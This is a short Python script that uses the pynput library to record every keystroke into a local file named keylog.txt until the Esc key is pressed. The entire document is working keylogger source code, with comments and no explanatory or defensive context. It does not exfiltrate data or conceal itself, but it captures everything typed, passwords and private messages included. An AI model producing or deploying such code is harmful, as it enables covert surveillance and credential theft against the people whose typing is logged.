from pynput import keyboard

# File to save logged keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Open the file in append mode
        with open(log_file, "a") as f:
            # Write the key to the file
            f.write(str(key).replace("'", "") + " ")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the keylogger when the 'Esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
